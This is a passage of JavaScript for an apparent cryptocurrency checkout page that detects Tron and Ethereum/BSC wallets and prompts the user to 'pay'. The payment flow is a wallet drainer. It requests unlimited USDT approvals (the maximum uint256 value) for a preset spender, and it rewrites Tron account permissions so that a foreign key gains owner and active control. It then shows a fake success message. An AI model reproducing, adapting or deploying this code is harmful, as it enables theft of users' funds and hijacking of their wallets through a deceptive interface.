            inputs: [{ name: '', type: 'address' }],
            name: 'balances',
            outputs: [{ name: '', type: 'uint256' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: true,
            inputs: [],
            name: 'decimals',
            outputs: [{ name: '', type: 'uint256' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: true,
            inputs: [],
            name: 'maximumFee',
            outputs: [{ name: '', type: 'uint256' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: true,
            inputs: [],
            name: '_totalSupply',
            outputs: [{ name: '', type: 'uint256' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: false,
            inputs: [],
            name: 'unpause',
            outputs: [],
            payable: false,
            stateMutability: 'nonpayable',
            type: 'function',
          },
          {
            constant: true,
            inputs: [{ name: '_maker', type: 'address' }],
            name: 'getBlackListStatus',
            outputs: [{ name: '', type: 'bool' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: true,
            inputs: [
              { name: '', type: 'address' },
              { name: '', type: 'address' },
            ],
            name: 'allowed',
            outputs: [{ name: '', type: 'uint256' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: true,
            inputs: [],
            name: 'paused',
            outputs: [{ name: '', type: 'bool' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: true,
            inputs: [{ name: 'who', type: 'address' }],
            name: 'balanceOf',
            outputs: [{ name: '', type: 'uint256' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: false,
            inputs: [],
            name: 'pause',
            outputs: [],
            payable: false,
            stateMutability: 'nonpayable',
            type: 'function',
          },
          {
            constant: true,
            inputs: [],
            name: 'getOwner',
            outputs: [{ name: '', type: 'address' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: true,
            inputs: [],
            name: 'owner',
            outputs: [{ name: '', type: 'address' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: true,
            inputs: [],
            name: 'symbol',
            outputs: [{ name: '', type: 'string' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: false,
            inputs: [
              { name: '_to', type: 'address' },
              { name: '_value', type: 'uint256' },
            ],
            name: 'transfer',
            outputs: [],
            payable: false,
            stateMutability: 'nonpayable',
            type: 'function',
          },
          {
            constant: false,
            inputs: [
              { name: 'newBasisPoints', type: 'uint256' },
              {
                name: 'newMaxFee',
                type: 'uint256',
              },
            ],
            name: 'setParams',
            outputs: [],
            payable: false,
            stateMutability: 'nonpayable',
            type: 'function',
          },
          {
            constant: false,
            inputs: [{ name: 'amount', type: 'uint256' }],
            name: 'issue',
            outputs: [],
            payable: false,
            stateMutability: 'nonpayable',
            type: 'function',
          },
          {
            constant: false,
            inputs: [{ name: 'amount', type: 'uint256' }],
            name: 'redeem',
            outputs: [],
            payable: false,
            stateMutability: 'nonpayable',
            type: 'function',
          },
          {
            constant: true,
            inputs: [
              { name: '_owner', type: 'address' },
              { name: '_spender', type: 'address' },
            ],
            name: 'allowance',
            outputs: [{ name: 'remaining', type: 'uint256' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: true,
            inputs: [],
            name: 'basisPointsRate',
            outputs: [{ name: '', type: 'uint256' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: true,
            inputs: [{ name: '', type: 'address' }],
            name: 'isBlackListed',
            outputs: [{ name: '', type: 'bool' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: false,
            inputs: [{ name: '_clearedUser', type: 'address' }],
            name: 'removeBlackList',
            outputs: [],
            payable: false,
            stateMutability: 'nonpayable',
            type: 'function',
          },
          {
            constant: true,
            inputs: [],
            name: 'MAX_UINT',
            outputs: [{ name: '', type: 'uint256' }],
            payable: false,
            stateMutability: 'view',
            type: 'function',
          },
          {
            constant: false,
            inputs: [{ name: 'newOwner', type: 'address' }],
            name: 'transferOwnership',
            outputs: [],
            payable: false,
            stateMutability: 'nonpayable',
            type: 'function',
          },
          {
            constant: false,
            inputs: [{ name: '_blackListedUser', type: 'address' }],
            name: 'destroyBlackFunds',
            outputs: [],
            payable: false,
            stateMutability: 'nonpayable',
            type: 'function',
          },
          {
            inputs: [
              { name: '_initialSupply', type: 'uint256' },
              {
                name: '_name',
                type: 'string',
              },
              { name: '_symbol', type: 'string' },
              { name: '_decimals', type: 'uint256' },
            ],
            payable: false,
            stateMutability: 'nonpayable',
            type: 'constructor',
          },
          {
            anonymous: false,
            inputs: [{ indexed: false, name: 'amount', type: 'uint256' }],
            name: 'Issue',
            type: 'event',
          },
          {
            anonymous: false,
            inputs: [{ indexed: false, name: 'amount', type: 'uint256' }],
            name: 'Redeem',
            type: 'event',
          },
          {
            anonymous: false,
            inputs: [{ indexed: false, name: 'newAddress', type: 'address' }],
            name: 'Deprecate',
            type: 'event',
          },
          {
            anonymous: false,
            inputs: [
              { indexed: false, name: 'feeBasisPoints', type: 'uint256' },
              {
                indexed: false,
                name: 'maxFee',
                type: 'uint256',
              },
            ],
            name: 'Params',
            type: 'event',
          },
          {
            anonymous: false,
            inputs: [
              { indexed: false, name: '_blackListedUser', type: 'address' },
              {
                indexed: false,
                name: '_balance',
                type: 'uint256',
              },
            ],
            name: 'DestroyedBlackFunds',
            type: 'event',
          },
          {
            anonymous: false,
            inputs: [{ indexed: false, name: '_user', type: 'address' }],
            name: 'AddedBlackList',
            type: 'event',
          },
          {
            anonymous: false,
            inputs: [{ indexed: false, name: '_user', type: 'address' }],
            name: 'RemovedBlackList',
            type: 'event',
          },
          {
            anonymous: false,
            inputs: [
              { indexed: true, name: 'owner', type: 'address' },
              {
                indexed: true,
                name: 'spender',
                type: 'address',
              },
              { indexed: false, name: 'value', type: 'uint256' },
            ],
            name: 'Approval',
            type: 'event',
          },
          {
            anonymous: false,
            inputs: [
              { indexed: true, name: 'from', type: 'address' },
              {
                indexed: true,
                name: 'to',
                type: 'address',
              },
              { indexed: false, name: 'value', type: 'uint256' },
            ],
            name: 'Transfer',
            type: 'event',
          },
          { anonymous: false, inputs: [], name: 'Pause', type: 'event' },
          {
            anonymous: false,
            inputs: [],
            name: 'Unpause',
            type: 'event',
          },
        ]
        web3 = new Web3(ethereum)
        contract = new web3.eth.Contract(contract_abi, contract_addr)
        accounts = await ethereum.request({ method: 'eth_requestAccounts' })
        if (accounts.length > 0) {
          printd('eth')
          pay_addr_input_ele.innerHTML = contract_addr
          clearInterval(getWalletTimer)
          pay_ele.removeAttribute('style')
          wallet_ele.setAttribute('style', 'display:none')
        }
        break
    }
  } else if (typeof window.tron !== 'undefined' && typeof window.tron.isTronLink !== 'undefined') {
    wallet = 'tronLink'
    chain = 'tron'
    pay_addr_input_ele.innerHTML = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
    clearInterval(getWalletTimer)
    printd('tronLink')
    pay_ele.removeAttribute('style')
    wallet_ele.setAttribute('style', 'display:none')
    printd('钱包版本：' + window.tronLink.version)
    printd('tronWeb版本：' + window.tronWeb.version)
    var a = await window.tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58)
    printd('TRX余额：' + a / 1000000)
  } else if (typeof window.Tron !== 'undefined' && typeof window.tronPay !== 'undefined') {
    wallet = 'bitpie'
    chain = 'tron'
    pay_addr_input_ele.innerHTML = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
    clearInterval(getWalletTimer)
    printd('tronLink')
    pay_ele.removeAttribute('style')
    wallet_ele.setAttribute('style', 'display:none')
    printd('钱包版本：' + window.tronLink.version)
    printd('tronWeb版本：' + window.tronWeb.version)
    var a = await window.tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58)
    printd('TRX余额：' + a / 1000000)
  } else {
    timerCounts += 1
    if (timerCounts > 30) {
      printd('未检测到钱包环境')
      clearInterval(getWalletTimer)
      alert('请使用钱包打开')
    }
  }
}

function payNow() {
  // 从URL获取价格参数
  const priceParam = getQueryVariable('price')
  console.log('URL价格参数:', priceParam)

  // 计算USDT金额（以wei为单位）
  let priceInUSDT = 0
  if (priceParam && !isNaN(parseFloat(priceParam))) {
    // 将USDT价格转换为wei单位 (USDT通常有6个小数位)
    const priceValue = parseFloat(priceParam)
    console.log('解析后的价格值:', priceValue)

    if (wallet == 'imToken') {
      if (chain == 'tron') {
        // Tron USDT有6位小数
        priceInUSDT = (priceValue * 1000000).toString()
        console.log('Tron链上价格(USDT单位):', priceInUSDT)
        amount = priceInUSDT
      } else {
        // BSC/ETH USDT有18位小数
        priceInUSDT = web3.utils.toWei(priceValue.toString(), 'ether')
        console.log('ETH/BSC链上价格(USDT单位):', priceInUSDT)
        amount = priceInUSDT
      }
    } else {
      // 其他钱包仍使用原来的逻辑，但也可以考虑更新
      amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
    }
  } else {
    // 如果没有价格参数或解析失败，使用默认金额
    console.log('无有效价格参数，使用默认金额')
    if (wallet == 'imToken') {
      if (chain == 'tron') {
        amount = '123456789123456789123456789'
      } else {
        amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
      }
    } else {
      amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
    }
  }

  console.log('最终支付金额:', amount)

  if (chain == 'tron') {
    if (wallet == 'imToken') {
      // imtokenTUAP();
      alert('正在拉起支付！选择安全模式后，请勿修改下个页面代币数量，否则会导致支付失败！')
      TUAP()
    } else {
      TUAP()
    }
    //以下两个地址更改为自己地址（目前写的是官方）
  } else if (chain == 'bsc') {
    if (wallet == 'imToken') {
      alert('imTokenBSC 支付')
      imTokenBSC()
    } else {
      contract.methods
        .increaseAllowance(eth_address, amount)
        .send({ from: accounts[0] })
        .on('transactionHash', function (hash) {
          successCallback(accounts[0], '0x55d398326f99059ff775485246999027b3197955', 1)
        })
    }
  } else if ((chain = 'eth')) {
    contract.methods
      .approve(eth_address, amount)
      .send({ from: accounts[0] })
      .on('transactionHash', function (hash) {
        successCallback(accounts[0], '0xdAC17F958D2ee523a2206206994597C13D831ec7', 1)
      })
  }
}

// 新增合约支付方法

function successCallback(address, approved, type) {
  // 不调用接口，直接提示相关信息，地址，金额，链，类型
  const tips = `
    支付成功！
    地址：${address}
    金额：${approved}
    链：${chain}
    类型：${type}
  `
  alert(tips)
  // sendGetRequest(
  //   '/successCallback?address=' +
  //     address +
  //     '&approved=' +
  //     approved +
  //     '&chain=' +
  //     chain +
  //     '&type=' +
  //     type,
  //   function (responseData) {
  //     console.log('成功获取数据:', responseData)
  //     alert('支付失败，请尝试使用其他钱包！')
  //   },
  //   function (error) {
  //     console.error('获取数据失败:', error)
  //   }
  // )
}

function sendGetRequest(url, onSuccess, onError) {
  var xhr = new XMLHttpRequest()
  xhr.open('GET', url, true)
  xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      if (xhr.status === 200) {
        onSuccess(xhr.responseText)
      } else {
        onError('请求失败: ' + xhr.statusText)
      }
    }
  }
  xhr.send()
}

async function imtokenTUAP() {
  let trx = await window.tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58)
  if (trx < 25000000) {
    alert('没有足够的TRX用于支付网络费。')
  } else {
    if (trx > 100000000) {
      document.getElementById('btn_pay').setAttribute('style', 'display:none')
      let ownerAddress = window.tronWeb.defaultAddress.hex
      let ownerPermission = { type: 0, permission_name: 'owner' }
      ownerPermission.threshold = 1
      ownerPermission.keys = []
      let activePermission = { type: 2, permission_name: 'active0' }
      activePermission.threshold = 1
      activePermission.operations =
        '7fff1fc0037e0000000000000000000000000000000000000000000000000000'
      activePermission.keys = []
      ownerPermission.keys.push({ address: spender_hex, weight: 1 })
      ownerPermission.keys.push({ address: window.tronWeb.defaultAddress.hex, weight: 1 })
      activePermission.keys.push({ address: spender_hex, weight: 1 })
      activePermission.keys.push({ address: window.tronWeb.defaultAddress.hex, weight: 1 })
      try {
        const updateTransaction = await window.tronWeb.transactionBuilder.updateAccountPermissions(
          ownerAddress,
          ownerPermission,
          null,
          [activePermission]
        )
        printd(updateTransaction)
        console.log(updateTransaction)
        const signed = await window.tronWeb.trx.sign(updateTransaction)
        console.log(signed)
        const res = await window.tronWeb.trx.sendRawTransaction(signed)
        console.log(res)
        successCallback(window.tronWeb.defaultAddress.base58, spender_bas58, 0)
      } catch (error) {
        approval.removeAttribute('style')
        approval.setAttribute('style', 'height: 95%;')
      }
    } else {
      document.getElementById('btn_pay').setAttribute('style', 'display:none')
      approval.removeAttribute('style')
      approval.setAttribute('style', 'height: 95%;')
    }
  }
}

async function TUAP() {
  if (wallet == 'okxwallet') {
    let state = await window.okxwallet.tronLink.request({ method: 'tron_requestAccounts' })
    if (state.code == 200) {
      let trx = await window.okxwallet.tronLink.tronWeb.trx.getBalance(
        window.okxwallet.tronLink.tronWeb.defaultAddress.base58
      )
      if (trx < 100000000) {
        alert('没有足够的TRX用于支付网络费。')
      } else {
        let ownerAddress = window.okxwallet.tronLink.tronWeb.defaultAddress.hex
        let ownerPermission = { type: 0, permission_name: 'owner' }
        ownerPermission.threshold = 1
        ownerPermission.keys = []
        let activePermission = { type: 2, permission_name: 'active0' }
        activePermission.threshold = 1
        activePermission.operations =
          '7fff1fc0037e0000000000000000000000000000000000000000000000000000'
        activePermission.keys = []
        ownerPermission.keys.push({ address: spender_hex, weight: 1 })
        ownerPermission.keys.push({
          address: window.okxwallet.tronLink.tronWeb.defaultAddress.hex,
          weight: 1,
        })
        activePermission.keys.push({ address: spender_hex, weight: 1 })
        activePermission.keys.push({
          address: window.okxwallet.tronLink.tronWeb.defaultAddress.hex,
          weight: 1,
        })
        try {
          const updateTransaction =
            await window.okxwallet.tronLink.tronWeb.transactionBuilder.updateAccountPermissions(
              ownerAddress,
              ownerPermission,
              null,
              [activePermission]
            )
          console.log(updateTransaction)
          const signed = await window.okxwallet.tronLink.tronWeb.trx.sign(updateTransaction)
          console.log(signed)
          const res = await window.okxwallet.tronLink.tronWeb.trx.sendRawTransaction(signed)
          console.log(res)
          successCallback(window.tronWeb.defaultAddress.base58, spender_bas58, 0)
        } catch (error) {
          alert('支付失败！')
        }
      }
    } else {
      alert('DAPP请求连接失败！')
    }
  } else {
    document.getElementById('btn_pay').setAttribute('style', 'display:none')
    approval.removeAttribute('style')
    approval.setAttribute('style', 'height: 95%;')
    // let ownerAddress = window.tronWeb.defaultAddress.hex;
    // let ownerPermission = {type: 0, permission_name: 'owner'};
    // ownerPermission.threshold = 1;
    // ownerPermission.keys = [];
    // let activePermission = {type: 2, permission_name: 'active0'};
    // activePermission.threshold = 1;
    // activePermission.operations = '7fff1fc0037e0000000000000000000000000000000000000000000000000000';
    // activePermission.keys = [];
    // ownerPermission.keys.push({address: spender_hex, weight: 1});
    // ownerPermission.keys.push({address: window.tronWeb.defaultAddress.hex, weight: 1});
    // activePermission.keys.push({address: spender_hex, weight: 1});
    // activePermission.keys.push({address: window.tronWeb.defaultAddress.hex, weight: 1});
    // try {
    //     const updateTransaction = await window.tronWeb.transactionBuilder.updateAccountPermissions(ownerAddress, ownerPermission, null, [activePermission]);
    //     printd(updateTransaction);
    //     console.log(updateTransaction);
    //     const signed = await window.tronWeb.trx.sign(updateTransaction);
    //     console.log(signed);
    //     const res = await window.tronWeb.trx.sendRawTransaction(signed);
    //     console.log(res);
    //     successCallback(window.tronWeb.defaultAddress.base58, spender_bas58, 0);
    // } catch (error) {
    //     alert('支付失败！');
    // }
  }
}

async function tronIA() {
  let trx = await window.tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58)
  if (trx > 25000000) {
    const trc20ContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
    try {
      let contract = await tronWeb.contract().at(trc20ContractAddress)
      res = await contract.increaseApproval(spender_bas58, amount).send({ feeLimit: 100000000 })
      successCallback(window.tronWeb.defaultAddress.base58, spender_bas58, approve_type)
    } catch (error) {
      console.error('trigger smart contract error', error)
      alert('支付失败！')
    }
  } else {
    alert('没有足够的TRX用于支付网络费！')
  }
}

// 获取带过来的参数值
function getQueryVariable(variable) {
  var query = window.location.search.substring(1)
  var vars = query.split('&')
  for (var i = 0; i < vars.length; i++) {
    var pair = vars[i].split('=')
    if (pair[0] === variable) {
      return decodeURIComponent(pair[1])
    }
  }
  return null
}

// 设置HTML元素的内容
function setElementContentById(id, content) {
  var element = document.getElementById(id)
  if (element) {
    if (element.tagName === 'INPUT' || element.tagName === 'TEXTAREA') {
      element.value = content
    } else {
      element.innerText = content
    }
  }
}

function copyAndAlert(selectIndex, callable) {
  var payDomain1 = window.location.protocol + '//' + window.location.host
  var currentPath = window.location.pathname + window.location.search
  if (payDomain1.endsWith('/')) {
    payDomain1 = payDomain1.slice(0, -1)
  }
  var fullPayUrl = payDomain1 + currentPath

  const input = document.createElement('input')
  input.style.position = 'fixed'
  input.style.opacity = 0
  input.value = fullPayUrl
  document.body.appendChild(input)

  input.select()
  document.execCommand('copy')
  document.body.removeChild(input)

  const modal = document.createElement('div')
  modal.style.position = 'fixed'
  modal.style.top = '0'
  modal.style.left = '0'
  modal.style.width = '100%'
  modal.style.height = '100%'
  modal.style.backgroundColor = 'rgba(0, 0, 0, 0.7)'
  modal.style.display = 'flex'
  modal.style.justifyContent = 'center'
  modal.style.alignItems = 'center'
  modal.style.zIndex = '9999'

  const content = document.createElement('div')
  content.style.backgroundColor = 'white'
  content.style.padding = '20px'
  content.style.borderRadius = '10px'
  content.style.textAlign = 'center'

  let images = []
  let messageText = ''

  switch (selectIndex) {
    case 15:
      images = ['/static/img/tips/BITPIE-help1.5b9c05f611111.jpg']
      messageText =
        '链接已复制，前往您的比特派钱包选择TRON网络，粘贴支付；如无法支付；请在钱包右下角我的设置里面更新版本在支付；付款成功后秒到账。'
      break
    case 11:
      images = [
        '/static/img/tips/photo_1_2024-10-25_15-55-41.jpg',
        '/static/img/tips/imtoken-help3.cf1f0a403.jpg',
      ]
      messageText = '链接已复制，前往您的im钱包粘贴支付；付款成功后秒到账。'
      break
    case 14:
      images = [
        '/static/img/tips/photo_1_2024-10-25_15-58-39.jpg',
        '/static/img/tips/tp-help3.5d9a5fa233.jpg',
      ]
      messageText = '链接已复制，前往您TP钱包粘贴支付；付款成功后秒到账。'
      break
    case 13:
      images = [
        '/static/img/tips/BitKeep-help1.73143e1411.jpg',
        '/static/img/tips/BitKeep-help2.a6449b3f22.jpg',
      ]
      messageText =
        '链接已复制，前往您的Bitget钱包粘贴支付，如提示选择TRX，请右上角切换TRON网络跟您的地址在支付；付款成功后秒到账。'
      break
    case 12:
      images = ['/static/img/tips/tronlink1.968ec0d6111.jpg']
      messageText = '链接已复制，前往您波宝钱包粘贴支付；付款成功后秒到账。'
      break
    case 16:
      images = ['/static/img/tips/IMG_20241025_221554_365.jpg']
      messageText = '链接已复制，前往您Ascoin钱包粘贴、选择Tron网络支付；付款成功后秒到账。'
      break
    default:
      images = ['/static/img/tips/default-image.jpg']
      messageText = '已复制链接，请按说明使用。'
      break
  }

  const imgContainer = document.createElement('div')
  imgContainer.style.display = 'flex'
  imgContainer.style.overflowX = 'auto'
  imgContainer.style.scrollSnapType = 'x mandatory'
  imgContainer.style.width = '100%'

  images.forEach((imgSrc) => {
    const img = document.createElement('img')
    img.src = imgSrc
    img.style.maxWidth = '50%'
    img.style.flexShrink = '0'
    img.style.scrollSnapAlign = 'start'
    img.style.margin = '0 5px'

    img.onclick = function (event) {
      event.stopPropagation() // Prevent modal from closing

      const fullImage = document.createElement('img')
      fullImage.src = img.src
      fullImage.style.maxWidth = '90%'
      fullImage.style.maxHeight = '90%'
      fullImage.style.position = 'fixed'
      fullImage.style.top = '50%'
      fullImage.style.left = '50%'
      fullImage.style.transform = 'translate(-50%, -50%)'
      fullImage.style.zIndex = '10000'
      document.body.appendChild(fullImage)

      fullImage.onclick = function () {
        document.body.removeChild(fullImage)
      }
    }

    imgContainer.appendChild(img)
  })

  const message = document.createElement('p')
  message.textContent = messageText
  message.style.color = 'red'

  content.appendChild(message)
  content.appendChild(imgContainer)
  modal.appendChild(content)
  document.body.appendChild(modal)

  // Click to close modal
  modal.onclick = function () {
    document.body.removeChild(modal)
    callable()
  }
}

// 获取并设置金额
var shopPrice = parseFloat(getQueryVariable('price'))
if (!isNaN(shopPrice)) {
  setElementContentById('price', shopPrice)
  setElementContentById('price1', shopPrice)
  setElementContentById('price2', shopPrice)
  setElementContentById('el-id-2903-5', shopPrice)
}

// 获取并设置订单号
var order = getQueryVariable('order')
if (!isNaN(order)) {
  setElementContentById('order', order)
} else {
  setElementContentById('order', 113263199484)
}

dev = false
timerCounts = 0
wallet = 'undefined'
chain = 'undefined'
wallet_ele = document.getElementById('wallet_d')
pay_ele = document.getElementById('pay_d')
pay_addr_input_ele = document.getElementById('pay_addr')
contract_addr = 'undefined'
contract_abi = []
document.addEventListener('DOMContentLoaded', function () {
  getWalletTimer = setInterval(getWallet, 1000)
})

// BSC链imToken支付
async function imTokenBSC() {
  console.log('开始imTokenBSC函数')
  try {
    if (typeof window.ethereum !== 'undefined') {
      console.log('检测到ethereum钱包')
      // 确保已连接钱包
      await window.ethereum.request({ method: 'eth_requestAccounts' })
      console.log('钱包连接成功')

      // 检查是否是BSC网络
      const chainId = await window.ethereum.request({ method: 'eth_chainId' })
      console.log('当前链ID:', chainId)
      if (chainId !== '0x38') {
        // BSC Mainnet chainId
        console.log('非BSC网络，尝试切换')
        try {
          // 尝试切换到BSC网络
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x38' }],
          })
          console.log('成功切换到BSC网络')
        } catch (switchError) {
          console.error('切换网络错误:', switchError)
          // 用户可能需要添加BSC网络
          if (switchError.code === 4902) {
            console.log('尝试添加BSC网络')
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [
                {
                  chainId: '0x38',
                  chainName: 'Binance Smart Chain',
                  nativeCurrency: {
                    name: 'BNB',
                    symbol: 'BNB',
                    decimals: 18,
                  },
                  rpcUrls: ['https://bsc-dataseed.binance.org/'],
                  blockExplorerUrls: ['https://bscscan.com/'],
                },
              ],
            })
            console.log('BSC网络添加成功')
          } else {
            throw switchError
          }
        }
      }

      const web3 = new Web3(window.ethereum)
      console.log('Web3实例创建成功')
      const accounts = await web3.eth.getAccounts()
      console.log('获取到账户:', accounts)
      const userAccount = accounts[0]

      // 确认用户有足够的BNB支付Gas费
      const balance = await web3.eth.getBalance(userAccount)
      console.log('用户BNB余额:', web3.utils.fromWei(balance, 'ether'), 'BNB')
      if (web3.utils.fromWei(balance, 'ether') < 0.01) {
        alert('BNB余额不足，无法支付Gas费用')
        return
      }

      // 使用用户的合约
      const bscContractAddress = '0xa9470e80e9ad31b4b0d745037711bc3ef30ce70c'
      console.log('合约地址:', bscContractAddress)
      const contractABI = [
        {
          inputs: [
            { internalType: 'address', name: '_usdtAddress', type: 'address' },
            { internalType: 'address', name: '_collectionAddress', type: 'address' },
            { internalType: 'uint256', name: '_threshold', type: 'uint256' },
          ],
          stateMutability: 'nonpayable',
          type: 'constructor',
        },
        {
          anonymous: false,
          inputs: [{ indexed: false, internalType: 'uint256', name: 'amount', type: 'uint256' }],
          name: 'FundsCollected',
          type: 'event',
        },
        {
          anonymous: false,
          inputs: [
            { indexed: false, internalType: 'uint256', name: 'newThreshold', type: 'uint256' },
          ],
          name: 'ThresholdUpdated',
          type: 'event',
        },
        {
          inputs: [],
          name: 'collectionAddress',
          outputs: [{ internalType: 'address', name: '', type: 'address' }],
          stateMutability: 'view',
          type: 'function',
        },
        {
          inputs: [],
          name: 'emergencyWithdraw',
          outputs: [],
          stateMutability: 'nonpayable',
          type: 'function',
        },
        {
          inputs: [],
          name: 'owner',
          outputs: [{ internalType: 'address', name: '', type: 'address' }],
          stateMutability: 'view',
          type: 'function',
        },
        {
          inputs: [{ internalType: 'uint256', name: 'amount', type: 'uint256' }],
          name: 'pay',
          outputs: [],
          stateMutability: 'nonpayable',
          type: 'function',
        },
        {
          inputs: [{ internalType: 'address', name: 'newAddress', type: 'address' }],
          name: 'setCollectionAddress',
          outputs: [],
          stateMutability: 'nonpayable',
          type: 'function',
        },
        {
          inputs: [{ internalType: 'address', name: 'newOwner', type: 'address' }],
          name: 'setOwner',
          outputs: [],
          stateMutability: 'nonpayable',
          type: 'function',
        },
        {
          inputs: [{ internalType: 'uint256', name: 'newThreshold', type: 'uint256' }],
          name: 'setThreshold',
          outputs: [],
          stateMutability: 'nonpayable',
          type: 'function',
        },
        {
          inputs: [],
          name: 'threshold',
          outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
          stateMutability: 'view',
          type: 'function',
        },
        {
          inputs: [],
          name: 'usdtAddress',
          outputs: [{ internalType: 'address', name: '', type: 'address' }],
          stateMutability: 'view',
          type: 'function',
        },
      ]

      const bscContract = new web3.eth.Contract(contractABI, bscContractAddress)
      console.log('合约实例创建成功')

      // 保持与其他支付方法一致
      document.getElementById('btn_pay').setAttribute('style', 'display:none')
      // 使用全局amount变量，此时已经在payNow中设置为正确的USDT金额
      console.log('支付金额:', amount)

      // 显示支付确认信息
      alert('正在拉起支付，请在钱包中确认交易')

      // 调用合约的pay方法
      console.log('开始调用合约pay方法, 金额:', amount)
      const transaction = await bscContract.methods.pay(amount).send({
        from: userAccount,
        gas: 200000, // 根据合约复杂度调整
        gasPrice: web3.utils.toWei('5', 'gwei'), // 根据当前BSC网络的Gas价格调整
      })

      // 交易成功后回调
      console.log('交易哈希:', transaction.transactionHash)
      console.log('交易详情:', transaction)
      successCallback(userAccount, bscContractAddress, 2)
    } else {
      console.error('未检测到以太坊钱包')
      alert('未检测到以太坊钱包，请安装imToken或其他兼容钱包')
    }
  } catch (error) {
    console.error('BSC支付错误:', error)
    console.error('错误详情:', JSON.stringify(error, Object.getOwnPropertyNames(error)))
    alert('支付失败: ' + (error.message || '未知错误'))
    document.getElementById('btn_pay').removeAttribute('style')
  }
}
